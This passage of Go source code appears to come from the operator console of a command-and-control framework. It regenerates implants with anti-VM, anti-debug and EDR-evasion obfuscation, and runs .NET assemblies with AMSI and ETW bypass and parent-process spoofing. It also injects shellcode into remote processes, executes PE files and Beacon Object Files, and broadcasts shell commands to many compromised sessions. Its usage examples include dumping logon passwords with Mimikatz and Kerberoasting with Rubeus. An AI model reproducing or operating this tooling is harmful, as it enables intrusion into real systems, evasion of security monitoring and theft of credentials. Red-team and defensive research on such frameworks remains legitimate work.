		case "edr_detection":
			req.Options["edr_detection"] = "true"
		case "network_fingerprinting":
			req.Options["network_fingerprinting"] = "true"
		case "anti_vm":
			req.Options["anti_vm"] = "true"
		case "anti_debug":
			req.Options["anti_debug"] = "true"
		case "sleep_mask":
			req.Options["sleep_mask"] = "true"
		}
	}

	if targetBuild.Debug {
		req.Options["debug"] = "true"
	}

	// Always enable persistent mode
	req.Options["persistent_mode"] = "true"

	// Show generation info
	fmt.Printf("%s Regenerating %s/%s implant binary\n",
		colorize("[*]", colorBlue),
		targetBuild.Os,
		targetBuild.Arch)

	if targetBuild.ObfuscationLevel > 0 {
		levels := []string{"none", "light", "medium", "heavy", "extreme"}
		fmt.Printf("%s Enhanced obfuscation level: %s\n",
			colorize("[*]", colorBlue),
			colorize(levels[targetBuild.ObfuscationLevel], colorCyan))
	}

	if len(targetBuild.ObfuscationTechs) > 0 {
		fmt.Printf("%s Obfuscation techniques: %s\n",
			colorize("[*]", colorBlue),
			colorize(strings.Join(targetBuild.ObfuscationTechs, ", "), colorYellow))
	}

	// Call generation
	startTime := time.Now()
	resp, err := oc.client.GenerateImplant(context.Background(), req)
	buildDuration := time.Since(startTime)

	if err != nil {
		fmt.Printf("%s Failed to regenerate implant: %v\n", colorize("[!]", colorRed), err)
		return
	}

	if !resp.Success {
		fmt.Printf("%s Failed to regenerate implant: %s\n", colorize("[!]", colorRed), resp.Message)
		return
	}

	// Determine output directory
	outputDir := "./"
	if saveDir != "" {
		outputDir = saveDir
	}

	// Create output directory if it doesn't exist
	if err := os.MkdirAll(outputDir, 0755); err != nil {
		fmt.Printf("%s Failed to create output directory: %v\n", colorize("[!]", colorRed), err)
		return
	}

	// Save the generated implant
	outputPath := filepath.Join(outputDir, resp.Filename)
	if err := ioutil.WriteFile(outputPath, resp.Payload, 0755); err != nil {
		fmt.Printf("%s Failed to save implant: %v\n", colorize("[!]", colorRed), err)
		return
	}

	// Calculate file size
	fileSizeKB := float64(len(resp.Payload)) / 1024
	var sizeStr string
	if fileSizeKB < 1024 {
		sizeStr = fmt.Sprintf("%.1f KB", fileSizeKB)
	} else {
		sizeStr = fmt.Sprintf("%.1f MB", fileSizeKB/1024)
	}

	fmt.Printf("\n%s Implant regenerated successfully in %v!\n",
		colorize("[+]", colorGreen),
		buildDuration)
	fmt.Printf("%s Saved to: %s\n",
		colorize("[*]", colorBlue),
		colorize(outputPath, colorCyan))
	fmt.Printf("%s Size: %s\n",
		colorize("[*]", colorBlue),
		colorize(sizeStr, colorYellow))
	fmt.Printf("%s Format: %s\n",
		colorize("[*]", colorBlue),
		colorize(resp.Config.TransportType, colorMagenta))
}

// handleExecuteAssembly handles .NET assembly execution
// In-process execution only via go-clr
// WARNING: Assembly crashes or Environment.Exit() will terminate the implant
func (oc *OperatorConsole) handleExecuteAssembly(implantID string, args []string) {
	// Parse flags (Sliver-style with short flags)
	var inProcess bool
	var sacrificialProcess string
	var appDomain string
	var runtime string
	var amsiBypass bool
	var etwBypass bool
	var ppid uint32
	var className string
	var methodName string

	// Simple flag parsing
	assemblyPath := ""
	assemblyArgs := []string{}

	for i := 0; i < len(args); i++ {
		arg := args[i]

		switch arg {
		case "-i", "--in-process":
			inProcess = true
		case "-p", "--process":
			if i+1 < len(args) {
				sacrificialProcess = args[i+1]
				i++
			}
		case "-d", "--appdomain":
			if i+1 < len(args) {
				appDomain = args[i+1]
				i++
			}
		case "-r", "--runtime":
			if i+1 < len(args) {
				runtime = args[i+1]
				i++
			}
		case "-a", "--amsi-bypass":
			amsiBypass = true
		case "-e", "--etw-bypass":
			etwBypass = true
		case "--ppid":
			if i+1 < len(args) {
				if pid, err := strconv.ParseUint(args[i+1], 10, 32); err == nil {
					ppid = uint32(pid)
					i++
				}
			}
		case "-c", "--class":
			if i+1 < len(args) {
				className = args[i+1]
				i++
			}
		case "-m", "--method":
			if i+1 < len(args) {
				methodName = args[i+1]
				i++
			}
		default:
			if assemblyPath == "" {
				assemblyPath = arg
			} else {
				// Only add non-empty arguments
				if arg != "" {
					assemblyArgs = append(assemblyArgs, arg)
				}
			}
		}
	}

	if assemblyPath == "" {
		fmt.Printf("%s Usage: execute-assembly [flags] <assembly_path> [args...]\n", colorize("[!]", colorRed))
		fmt.Printf("\n%s:\n", colorize("Execution Modes", colorYellow))
		fmt.Printf("  %s: Sacrificial process via donut (DEFAULT, safer)\n", colorize("Sacrificial", colorGreen))
		fmt.Printf("  %s: In-process CLR hosting (faster but RISKY)\n", colorize("In-Process", colorYellow))
		fmt.Printf("\n%s:\n", colorize("Flags", colorYellow))
		fmt.Printf("  %s              Execute in implant process (RISKY)\n", colorize("-i, --in-process", colorCyan))
		fmt.Printf("  %s         Sacrificial process path (default: dllhost.exe)\n", colorize("-p, --process <path>", colorCyan))
		fmt.Printf("  %s      .NET runtime version (default: v4)\n", colorize("-r, --runtime <ver>", colorCyan))
		fmt.Printf("  %s          Enable AMSI bypass\n", colorize("-a, --amsi-bypass", colorCyan))
		fmt.Printf("  %s           Enable ETW bypass\n", colorize("-e, --etw-bypass", colorCyan))
		fmt.Printf("  %s    Custom AppDomain (in-process only)\n", colorize("-d, --appdomain <name>", colorCyan))
		fmt.Printf("  %s               Parent process ID for PPID spoofing\n", colorize("--ppid <pid>", colorCyan))
		fmt.Printf("  %s          Class name for DLL assemblies\n", colorize("-c, --class <name>", colorCyan))
		fmt.Printf("  %s         Method name for DLL assemblies\n", colorize("-m, --method <name>", colorCyan))
		fmt.Printf("\n%s:\n", colorize("Examples", colorYellow))
		fmt.Printf("  execute-assembly Seatbelt.exe -group=system\n")
		fmt.Printf("  execute-assembly -p 'C:\\\\Windows\\\\System32\\\\notepad.exe' Rubeus.exe kerberoast\n")
		fmt.Printf("  execute-assembly -p C:/Windows/System32/notepad.exe SharpDPAPI.exe\n")
		fmt.Printf("  execute-assembly --class MyClass --method Run assembly.dll arg1 arg2\n")
		fmt.Printf("  execute-assembly -a -e Mimikatz.exe\n")
		fmt.Printf("  execute-assembly -r v2.0.50727 OldAssembly.exe\n")
		fmt.Printf("\n%s: Windows paths - use double backslashes 'C:\\\\...' OR forward slashes C:/...\n",
			colorize("IMPORTANT", colorRed))
		fmt.Printf("%s: Sacrificial process is DEFAULT for safety. Use -i only with trusted assemblies!\n",
			colorize("NOTE", colorGreen))
		return
	}

	// Read assembly file
	data, err := ioutil.ReadFile(assemblyPath)
	if err != nil {
		fmt.Printf("%s Failed to read assembly file: %v\n", colorize("[!]", colorRed), err)
		return
	}

	// Build execution description and set method
	var execMode string
	var method pb.ExecuteAssemblyOptions_ExecutionMethod

	if inProcess {
		method = pb.ExecuteAssemblyOptions_IN_PROCESS
		execMode = colorize("in-process CLR", colorYellow) + colorize(" (RISKY: may crash implant)", colorRed)
	} else {
		method = pb.ExecuteAssemblyOptions_SACRIFICIAL
		processName := "dllhost.exe"
		if sacrificialProcess != "" {
			processName = filepath.Base(sacrificialProcess)
		}
		execMode = colorize("sacrificial process", colorGreen) +
			fmt.Sprintf(" (%s)", colorize(processName, colorCyan))
	}

	fmt.Printf("%s Executing assembly %s (%s) via %s\n",
		colorize("[*]", colorBlue),
		colorize(filepath.Base(assemblyPath), colorCyan),
		formatBytes(len(data)),
		execMode)

	if len(assemblyArgs) > 0 {
		fmt.Printf("%s Arguments: %v\n", colorize("[*]", colorBlue), assemblyArgs)
	}

	// Build options
	options := &pb.ExecuteAssemblyOptions{
		Method:             method,
		SacrificialProcess: sacrificialProcess,
		AppDomain:          appDomain,
		Runtime:            runtime,
		AmsiBypass:         amsiBypass,
		EtwBypass:          etwBypass,
		Ppid:               ppid,
		ClassName:          className,
		MethodName:         methodName,
	}

	cmd := &pb.CommandMessage{
		CommandId:              generateCommandID(),
		Type:                   pb.CommandMessage_EXECUTE_ASSEMBLY,
		Command:                filepath.Base(assemblyPath),
		Args:                   assemblyArgs,
		Data:                   data,
		ExecuteAssemblyOptions: options,
	}

	if err := oc.SendCommand(implantID, cmd); err != nil {
		fmt.Printf("%s Command failed: %v\n", colorize("[!]", colorRed), err)
	}
}

// handleExecuteShellcode executes raw shellcode using implant-side primitives
func (oc *OperatorConsole) handleExecuteShellcode(implantID string, args []string) {
	var methodStr = "self"
	var targetPID uint32
	var shellcodePath string
	var base64Blob string
	useBase64 := false

	for i := 0; i < len(args); i++ {
		switch args[i] {
		case "-m", "--method":
			if i+1 < len(args) {
				methodStr = strings.ToLower(args[i+1])
				i++
			}
		case "-p", "--pid":
			if i+1 < len(args) {
				if pid, err := strconv.ParseUint(args[i+1], 10, 32); err == nil {
					targetPID = uint32(pid)
				} else {
					fmt.Printf("%s Invalid PID value: %s\n", colorize("[!]", colorRed), args[i+1])
					return
				}
				i++
			}
		case "--base64", "--b64":
			if i+1 < len(args) {
				base64Blob = args[i+1]
				useBase64 = true
				i++
			}
		default:
			if strings.HasPrefix(args[i], "-") && strings.Contains(args[i], "=") {
				parts := strings.SplitN(args[i], "=", 2)
				switch parts[0] {
				case "--method":
					methodStr = strings.ToLower(parts[1])
				case "--pid":
					if pid, err := strconv.ParseUint(parts[1], 10, 32); err == nil {
						targetPID = uint32(pid)
					} else {
						fmt.Printf("%s Invalid PID value: %s\n", colorize("[!]", colorRed), parts[1])
						return
					}
				case "--base64", "--b64":
					base64Blob = parts[1]
					useBase64 = true
				default:
					fmt.Printf("%s Unknown option: %s\n", colorize("[!]", colorRed), args[i])
					return
				}
			} else if shellcodePath == "" {
				shellcodePath = args[i]
			} else {
				fmt.Printf("%s Unexpected argument: %s\n", colorize("[!]", colorRed), args[i])
				return
			}
		}
	}

	if !useBase64 && shellcodePath == "" {
		fmt.Printf("%s Usage: execute-shellcode [options] <shellcode_file>\n", colorize("[!]", colorRed))
		fmt.Printf("%s\n", colorize("Options:", colorYellow))
		fmt.Println("  -m, --method <self|remote|rtlcreateuserthread|userapc>")
		fmt.Println("  -p, --pid <pid>      Target PID (required for remote methods)")
		fmt.Println("      --base64 <blob>  Inline Base64 shellcode (no file needed)")
		fmt.Printf("%s\n", colorize("Examples:", colorYellow))
		fmt.Println("  execute-shellcode beacon.bin")
		fmt.Println("  execute-shellcode -m remote -p 1337 loader.bin")
		fmt.Println("  execute-shellcode --method userapc --pid 888 --base64 AAAA....")
		return
	}

	if useBase64 && shellcodePath != "" {
		fmt.Printf("%s Provide either a file path or --base64 payload, not both\n", colorize("[!]", colorRed))
		return
	}

	var data []byte
	var err error
	commandLabel := "inline-shellcode"
	if useBase64 {
		data, err = base64.StdEncoding.DecodeString(base64Blob)
		if err != nil {
			fmt.Printf("%s Failed to decode Base64 shellcode: %v\n", colorize("[!]", colorRed), err)
			return
		}
	} else {
		data, err = ioutil.ReadFile(shellcodePath)
		if err != nil {
			fmt.Printf("%s Failed to read shellcode file: %v\n", colorize("[!]", colorRed), err)
			return
		}
		commandLabel = filepath.Base(shellcodePath)
	}

	if len(data) == 0 {
		fmt.Printf("%s Shellcode payload is empty\n", colorize("[!]", colorRed))
		return
	}

	var method pb.ExecuteShellcodeOptions_ExecutionMethod
	switch strings.ToLower(methodStr) {
	case "", "self":
		method = pb.ExecuteShellcodeOptions_SELF
	case "remote":
		method = pb.ExecuteShellcodeOptions_REMOTE
	case "rtl", "rtlcreateuserthread", "rtlcreateuser", "rtlcreate":
		method = pb.ExecuteShellcodeOptions_RTL_CREATE_USER_THREAD
	case "userapc", "apc":
		method = pb.ExecuteShellcodeOptions_USER_APC
	default:
		fmt.Printf("%s Unknown execution method: %s\n", colorize("[!]", colorRed), methodStr)
		return
	}

	if method != pb.ExecuteShellcodeOptions_SELF && targetPID == 0 {
		fmt.Printf("%s Method %s requires --pid <target>\n", colorize("[!]", colorRed), methodStr)
		return
	}

	fmt.Printf("%s Executing %s of shellcode via %s\n",
		colorize("[*]", colorBlue),
		formatBytes(len(data)),
		colorize(strings.ToUpper(methodStr), colorCyan))
	if targetPID != 0 {
		fmt.Printf("%s Target PID: %d\n", colorize("[*]", colorBlue), targetPID)
	}

	options := &pb.ExecuteShellcodeOptions{
		Method: method,
		Pid:    targetPID,
	}

	cmd := &pb.CommandMessage{
		CommandId:               generateCommandID(),
		Type:                    pb.CommandMessage_EXECUTE_SHELLCODE,
		Command:                 commandLabel,
		Data:                    data,
		ExecuteShellcodeOptions: options,
	}

	if err := oc.SendCommand(implantID, cmd); err != nil {
		fmt.Printf("%s Command failed: %v\n", colorize("[!]", colorRed), err)
	}
}

// handleExecutePE converts a PE file to Donut shellcode server-side and executes it via sacrificial process
func (oc *OperatorConsole) handleExecutePE(implantID string, args []string) {
	if len(args) == 0 {
		fmt.Printf("%s Usage: execute-pe [options] <pe_path> [pe_args...]\n", colorize("[!]", colorRed))
		fmt.Printf("%s\n", colorize("Options:", colorYellow))
		fmt.Println("  -p, --process <path>     Sacrificial spawn-to process (default: WerFault.exe)")
		fmt.Println("      --ppid <pid>         Parent PID spoofing")
		fmt.Println("      --spawn-args <cmd>   Command-line arguments for sacrificial process")
		fmt.Printf("%s\n", colorize("Examples:", colorYellow))
		fmt.Println("  execute-pe mimikatz.exe \"privilege::debug\" \"sekurlsa::logonPasswords\"")
		fmt.Println("  execute-pe -p C:\\Windows\\System32\\dllhost.exe --ppid 4450 tool.exe")
		return
	}

	var spawnTo string
	var spawnArgs string
	var ppid uint32
	var pePath string
	var peArgs []string

	for i := 0; i < len(args); i++ {
		switch args[i] {
		case "-p", "--process", "--spawn", "--spawn-to":
			if i+1 < len(args) {
				spawnTo = args[i+1]
				i++
			}
		case "--ppid":
			if i+1 < len(args) {
				pid, err := strconv.ParseUint(args[i+1], 10, 32)
				if err != nil {
					fmt.Printf("%s Invalid PPID value: %s\n", colorize("[!]", colorRed), args[i+1])
					return
				}
				ppid = uint32(pid)
				i++
			}
		case "--spawn-args":
			if i+1 < len(args) {
				spawnArgs = args[i+1]
				i++
			}
		default:
			if strings.HasPrefix(args[i], "-") && strings.Contains(args[i], "=") {
				parts := strings.SplitN(args[i], "=", 2)
				switch parts[0] {
				case "--process", "--spawn", "--spawn-to":
					spawnTo = parts[1]
				case "--ppid":
					pid, err := strconv.ParseUint(parts[1], 10, 32)
					if err != nil {
						fmt.Printf("%s Invalid PPID value: %s\n", colorize("[!]", colorRed), parts[1])
						return
					}
					ppid = uint32(pid)
				case "--spawn-args":
					spawnArgs = parts[1]
				default:
					fmt.Printf("%s Unknown option: %s\n", colorize("[!]", colorRed), args[i])
					return
				}
			} else if pePath == "" {
				pePath = args[i]
			} else {
				peArgs = append(peArgs, args[i])
			}
		}
	}

	if pePath == "" {
		fmt.Printf("%s PE path is required\n", colorize("[!]", colorRed))
		return
	}

	data, err := ioutil.ReadFile(pePath)
	if err != nil {
		fmt.Printf("%s Failed to read PE file: %v\n", colorize("[!]", colorRed), err)
		return
	}

	if len(data) == 0 {
		fmt.Printf("%s PE payload is empty\n", colorize("[!]", colorRed))
		return
	}

	if spawnTo == "" {
		spawnTo = "C:\\Windows\\System32\\WerFault.exe"
	}

	fmt.Printf("%s Sending %s (%s) for Donut conversion\n",
		colorize("[*]", colorBlue),
		colorize(filepath.Base(pePath), colorCyan),
		formatBytes(len(data)))
	fmt.Printf("%s Spawn-to: %s\n", colorize("[*]", colorBlue), colorize(spawnTo, colorCyan))
	if spawnArgs != "" {
		fmt.Printf("%s Spawn arguments: %s\n", colorize("[*]", colorBlue), spawnArgs)
	}
	if len(peArgs) > 0 {
		fmt.Printf("%s PE arguments: %v\n", colorize("[*]", colorBlue), peArgs)
	}
	if ppid != 0 {
		fmt.Printf("%s PPID spoofing: %d\n", colorize("[*]", colorBlue), ppid)
	}

	options := &pb.ExecutePEOptions{
		SpawnTo:   spawnTo,
		Arguments: spawnArgs,
		Ppid:      ppid,
	}

	cmd := &pb.CommandMessage{
		CommandId:        generateCommandID(),
		Type:             pb.CommandMessage_EXECUTE_PE,
		Command:          filepath.Base(pePath),
		Args:             peArgs,
		Data:             data,
		ExecutePeOptions: options,
	}

	if err := oc.SendCommand(implantID, cmd); err != nil {
		fmt.Printf("%s Command failed: %v\n", colorize("[!]", colorRed), err)
	}
}

// handleBroadcastCommand executes a command across multiple sessions with filtering
func (oc *OperatorConsole) handleBroadcastCommand(command, osFilter, hostnameFilter, transportFilter string, timeout int32, dryRun, wait, isScript bool, scriptExtension, outputFile string) {
	if oc.client == nil {
		fmt.Printf("%s Not connected to server\n", colorize("[!]", colorRed))
		return
	}

	// Build the filter
	filter := &pb.BroadcastFilter{
		Os:              osFilter,
		HostnamePattern: hostnameFilter,
		Transport:       transportFilter,
	}

	// Dry-run mode: just show matching sessions
	if dryRun {
		fmt.Printf("%s Dry-run mode: showing matching sessions for command %q\n",
			colorize("[*]", colorBlue), command)
		oc.showMatchingSessions(filter)
		return
	}

	// Build the request
	req := &pb.BroadcastCommandRequest{
		Filter:          filter,
		Command:         command,
		Type:            pb.CommandMessage_SHELL,
		TimeoutSeconds:  timeout,
		IsScript:        isScript,
		ScriptExtension: scriptExtension,
	}

	if isScript {
		lines := strings.Count(command, "\n") + 1
		fmt.Printf("%s Broadcasting script: %d lines (%s)\n",
			colorize("[*]", colorBlue),
			lines,
			colorize("writes to temp file, executes, cleans up", colorDarkGray))
	} else {
		fmt.Printf("%s Broadcasting command: %s\n", colorize("[*]", colorBlue), colorize(command, colorCyan))
	}

	// Show filter info
	var filterParts []string
	if osFilter != "" {
		filterParts = append(filterParts, fmt.Sprintf("OS=%s", osFilter))
	}
	if hostnameFilter != "" {
		filterParts = append(filterParts, fmt.Sprintf("hostname=%s", hostnameFilter))
	}
	if transportFilter != "" {
		filterParts = append(filterParts, fmt.Sprintf("transport=%s", transportFilter))
	}
	if len(filterParts) > 0 {
		fmt.Printf("%s Filters: %s\n", colorize("[*]", colorBlue), strings.Join(filterParts, ", "))
	} else {
		fmt.Printf("%s Filters: %s\n", colorize("[*]", colorBlue), colorize("none (all sessions)", colorYellow))
	}

	// Send broadcast request
	resp, err := oc.client.BroadcastCommand(context.Background(), req)
	if err != nil {
		fmt.Printf("%s Failed to send broadcast: %v\n", colorize("[!]", colorRed), err)
		return
	}

	if !resp.Success {
		fmt.Printf("%s Broadcast failed: %s\n", colorize("[!]", colorRed), resp.Message)
		return
	}

	// If wait mode, poll for results before displaying
	if wait && len(resp.Results) > 0 {
		fmt.Printf("%s Waiting for results (timeout: %ds)...\n", colorize("[*]", colorBlue), timeout)
		oc.collectBroadcastResults(resp, timeout)
	}

	// Display results
	displayBroadcastResults(resp)

	// Write full outputs to file if specified
	if outputFile != "" && len(resp.Results) > 0 {
		oc.writeBroadcastOutputsToFile(resp, outputFile)
	}
}

// writeBroadcastOutputsToFile writes the full broadcast outputs to a file
func (oc *OperatorConsole) writeBroadcastOutputsToFile(resp *pb.BroadcastCommandResponse, outputFile string) {
	f, err := os.Create(outputFile)
	if err != nil {
		fmt.Printf("%s Failed to create output file: %v\n", colorize("[!]", colorRed), err)
		return
	}
	defer f.Close()

	// Write header
	fmt.Fprintf(f, "=== Broadcast Results ===\n")
	fmt.Fprintf(f, "Broadcast ID: %s\n", resp.BroadcastId)
	fmt.Fprintf(f, "Total Sessions: %d\n", resp.TotalSessions)
	fmt.Fprintf(f, "Commands Sent: %d\n", resp.CommandsSent)
	fmt.Fprintf(f, "Commands Failed: %d\n", resp.CommandsFailed)
	fmt.Fprintf(f, "Generated: %s\n", time.Now().Format(time.RFC3339))
	fmt.Fprintf(f, "\n")

	// Write each session's output
	for i, result := range resp.Results {
		fmt.Fprintf(f, "=== Session %d/%d ===\n", i+1, len(resp.Results))
		fmt.Fprintf(f, "Implant ID: %s\n", result.ImplantId)
		if result.Codename != "" {
			fmt.Fprintf(f, "Codename: %s\n", result.Codename)
		}
		fmt.Fprintf(f, "Hostname: %s\n", result.Hostname)
		fmt.Fprintf(f, "Status: %s\n", result.Status)
		fmt.Fprintf(f, "Command ID: %s\n", result.CommandId)
		if result.Error != "" {
			fmt.Fprintf(f, "Error: %s\n", result.Error)
		}
		fmt.Fprintf(f, "\n--- Output ---\n")
		if result.Output != "" {
			fmt.Fprintf(f, "%s\n", result.Output)
		} else {
			fmt.Fprintf(f, "(no output)\n")
		}
		fmt.Fprintf(f, "\n")
	}

	fmt.Printf("%s Full outputs written to: %s\n", colorize("[+]", colorGreen), outputFile)
}

// showMatchingSessions displays sessions that would match the given filter
func (oc *OperatorConsole) showMatchingSessions(filter *pb.BroadcastFilter) {
	sessions, err := oc.GetSessions()
	if err != nil {
		fmt.Printf("%s Failed to get sessions: %v\n", colorize("[!]", colorRed), err)
		return
	}

	var matched []*Session
	for _, session := range sessions {
		if oc.sessionMatchesFilter(session, filter) {
			matched = append(matched, session)
		}
	}

	if len(matched) == 0 {
		fmt.Printf("%s No sessions match the filter criteria\n", colorize("[!]", colorYellow))
		return
	}

	fmt.Printf("\n%s %d session(s) would match:\n\n", colorize("[+]", colorGreen), len(matched))
	printSessionsTable(matched)
}

// sessionMatchesFilter checks if a session matches the filter criteria (client-side)
func (oc *OperatorConsole) sessionMatchesFilter(session *Session, filter *pb.BroadcastFilter) bool {
	if filter == nil {
		return true
	}

	// Check OS filter
	if filter.Os != "" && !strings.EqualFold(session.OS, filter.Os) {
		return false
	}

	// Check hostname pattern
	if filter.HostnamePattern != "" {
		matched, err := regexp.MatchString(filter.HostnamePattern, session.Hostname)
		if err != nil || !matched {
			return false
		}
	}

	// Check transport
	if filter.Transport != "" && !strings.EqualFold(session.Transport, filter.Transport) {
		return false
	}

	return true
}

// waitForBroadcastResults polls for results from broadcast commands
// collectBroadcastResults polls for results and updates the response object
func (oc *OperatorConsole) collectBroadcastResults(resp *pb.BroadcastCommandResponse, timeout int32) {
	// Create a map of command ID to result index for fast lookup
	cmdToIdx := make(map[string]int)
	var pendingCount int

	for i, result := range resp.Results {
		if result.Status == "sent" || result.Status == "queued" {
			cmdToIdx[result.CommandId] = i
			pendingCount++
		}
	}

	if pendingCount == 0 {
		return
	}

	// Poll for results
	startTime := time.Now()
	maxWait := time.Duration(timeout) * time.Second
	pollInterval := 2 * time.Second
	completed := 0

	for time.Since(startTime) < maxWait && completed < pendingCount {
		for cmdID, idx := range cmdToIdx {
			// Skip already completed
			if resp.Results[idx].Status == "completed" {
				continue
			}

			resultReq := &pb.CommandResultRequest{
				CommandId:      cmdID,
				TimeoutSeconds: 1,
			}

			resultResp, err := oc.client.GetCommandResult(context.Background(), resultReq)
			if err != nil {
				continue
			}

			if resultResp.Ready {
				resp.Results[idx].Status = "completed"
				resp.Results[idx].Output = resultResp.Output
				if resultResp.Error != "" && resultResp.Error != "Pending..." {
					resp.Results[idx].Error = resultResp.Error
				}
				completed++
				fmt.Printf("\r%s %s: result received                    \n",
					colorize("[+]", colorGreen),
					colorize(resp.Results[idx].Codename, colorCyan))
			}
		}

		if completed >= pendingCount {
			break
		}

		// Show progress
		fmt.Printf("\r%s Waiting... (%d/%d complete)   ",
			colorize("[*]", colorBlue),
			completed,
			pendingCount)

		time.Sleep(pollInterval)
	}

	fmt.Printf("\r%s Collected %d/%d results                    \n\n",
		colorize("[+]", colorGreen),
		completed,
		pendingCount)
}

// handleGetResults fetches and displays the result of a command by ID
func (oc *OperatorConsole) handleGetResults(commandID string, timeout int32) {
	if oc.client == nil {
		fmt.Printf("%s Not connected to server\n", colorize("[!]", colorRed))
		return
	}

	fmt.Printf("%s Fetching result for command: %s\n", colorize("[*]", colorBlue), colorize(commandID, colorCyan))

	req := &pb.CommandResultRequest{
		CommandId:      commandID,
		TimeoutSeconds: timeout,
	}

	resp, err := oc.client.GetCommandResult(context.Background(), req)
	if err != nil {
		fmt.Printf("%s Failed to get result: %v\n", colorize("[!]", colorRed), err)
		return
	}

	if !resp.Ready {
		fmt.Printf("%s Result not ready yet (still pending)\n", colorize("[*]", colorYellow))
		fmt.Printf("%s Try again later or increase timeout with --timeout\n", colorize("[*]", colorBlue))
		return
	}

	// Display the result
	fmt.Printf("\n%s Command Result\n", colorize("[+]", colorGreen))
	fmt.Printf("%s\n", strings.Repeat("─", 50))

	if resp.Output != "" {
		fmt.Printf("%s\n", resp.Output)
	} else {
		fmt.Printf("%s\n", colorize("(no output)", colorDarkGray))
	}

	if resp.Error != "" && resp.Error != "Pending..." {
		fmt.Printf("\n%s %s\n", colorize("Error:", colorRed), resp.Error)
	}

	fmt.Printf("%s\n", strings.Repeat("─", 50))
}

func (oc *OperatorConsole) handleExecuteBOF(implantID string, args []string) {
	if len(args) == 0 {
		fmt.Printf("%s Usage: execute-bof [options] <bof_path> [bof_args...]\n", colorize("[!]", colorRed))
		fmt.Printf("\n%s:\n", colorize("Description", colorYellow))
		fmt.Println("  Execute Beacon Object Files (BOFs) in-process using goffloader")
		fmt.Printf("\n%s:\n", colorize("Argument Format (REQUIRED)", colorYellow))
		fmt.Println("  BOF arguments MUST have type prefixes:")
		fmt.Printf("    %s - ANSI string (e.g., %s)\n", colorize("z<string>", colorCyan), colorize("zMyString", colorGreen))
		fmt.Printf("    %s - Wide string (e.g., %s)\n", colorize("Z<string>", colorCyan), colorize("ZMyWideString", colorGreen))
		fmt.Printf("    %s - Integer (e.g., %s)\n", colorize("i<number>", colorCyan), colorize("i1234", colorGreen))
		fmt.Printf("    %s - Short (e.g., %s)\n", colorize("s<number>", colorCyan), colorize("s42", colorGreen))
		fmt.Printf("    %s - Binary data (e.g., %s)\n", colorize("b<hex>", colorCyan), colorize("b41424344", colorGreen))
		fmt.Printf("\n%s:\n", colorize("Options", colorYellow))
		fmt.Println("  --entry <name>           Entry point function name (default: go)")
		fmt.Printf("\n%s:\n", colorize("Examples", colorYellow))
		fmt.Println("  execute-bof whoami.x64.o")
		fmt.Println("  execute-bof dir.x64.o zC:\\\\Windows")
		fmt.Println("  execute-bof nslookup.x64.o zgoogle.com z8.8.8.8")
		fmt.Println("  execute-bof netstat.x64.o --entry main")
		fmt.Printf("\n%s:\n", colorize("Platform Support", colorYellow))
		fmt.Println("  - Windows x64 ONLY (goffloader limitation)")
		fmt.Println("  - 32-bit BOFs NOT supported yet")
		return
	}

	var entryPoint string
	var bofPath string
	var bofArgs []string

	// Parse arguments
	for i := 0; i < len(args); i++ {
		switch args[i] {
		case "--entry", "--entrypoint":
			if i+1 < len(args) {
				entryPoint = args[i+1]
				i++
			}
		default:
			// Handle --key=value format
			if strings.HasPrefix(args[i], "--") && strings.Contains(args[i], "=") {
				parts := strings.SplitN(args[i], "=", 2)
				switch parts[0] {
				case "--entry", "--entrypoint":
					entryPoint = parts[1]
				default:
					fmt.Printf("%s Unknown option: %s\n", colorize("[!]", colorRed), args[i])
					return
				}
			} else if bofPath == "" {
				bofPath = args[i]
			} else {
				bofArgs = append(bofArgs, args[i])
			}
		}
	}

	if bofPath == "" {
		fmt.Printf("%s BOF path is required\n", colorize("[!]", colorRed))
		return
	}

	// Read BOF file
	data, err := ioutil.ReadFile(bofPath)
	if err != nil {
		fmt.Printf("%s Failed to read BOF file: %v\n", colorize("[!]", colorRed), err)
		return
	}

	if len(data) == 0 {
		fmt.Printf("%s BOF payload is empty\n", colorize("[!]", colorRed))
		return
	}

	// Validate BOF is x64 COFF
	if len(data) < 2 {
		fmt.Printf("%s Invalid BOF file (too small)\n", colorize("[!]", colorRed))
		return
	}
	machine := uint16(data[0]) | uint16(data[1])<<8
	if machine != 0x8664 {
		fmt.Printf("%s Invalid BOF file (not x64 COFF, machine type: 0x%04x)\n",
			colorize("[!]", colorRed), machine)
		fmt.Printf("%s Expected x64 COFF (0x8664), got 0x%04x\n",
			colorize("[*]", colorBlue), machine)
		if machine == 0x014c {
			fmt.Printf("%s This is a 32-bit (x86) BOF - not yet supported by goffloader\n",
				colorize("[!]", colorYellow))
		}
		return
	}

	// Validate arguments have type prefixes
	for _, arg := range bofArgs {
		if len(arg) < 2 {
			fmt.Printf("%s Invalid argument '%s': too short (must have type prefix)\n",
				colorize("[!]", colorRed), arg)
			return
		}
		prefix := arg[0]
		if prefix != 'z' && prefix != 'Z' && prefix != 'i' && prefix != 's' && prefix != 'b' {
			fmt.Printf("%s Invalid argument '%s': missing type prefix (z/Z/i/s/b)\n",
				colorize("[!]", colorRed), arg)
			fmt.Printf("%s Example: %s for string, %s for int\n",
				colorize("[*]", colorBlue),
				colorize("zMyString", colorGreen),
				colorize("i1234", colorGreen))
			return
		}
	}

	// Set default entry point
	if entryPoint == "" {
		entryPoint = "go"
	}

	fmt.Printf("%s Executing BOF %s (%s) via %s\n",
		colorize("[*]", colorBlue),
		colorize(filepath.Base(bofPath), colorCyan),
		formatBytes(len(data)),
		colorize("in-process-goffloader", colorYellow))

	if entryPoint != "go" {
		fmt.Printf("%s Entry point: %s\n", colorize("[*]", colorBlue), colorize(entryPoint, colorCyan))
	}

	if len(bofArgs) > 0 {
		fmt.Printf("%s Arguments: %v\n", colorize("[*]", colorBlue), bofArgs)
	}

	// Build options
	options := &pb.BOFOptions{
		Method:     pb.BOFOptions_IN_PROCESS,
		EntryPoint: entryPoint,
		Arguments:  bofArgs,
	}

	cmd := &pb.CommandMessage{
		CommandId:  generateCommandID(),
		Type:       pb.CommandMessage_EXECUTE_BOF,
		Command:    filepath.Base(bofPath),
		Data:       data,
		BofOptions: options,
	}

	if err := oc.SendCommand(implantID, cmd); err != nil {
		fmt.Printf("%s Command failed: %v\n", colorize("[!]", colorRed), err)
	}
}
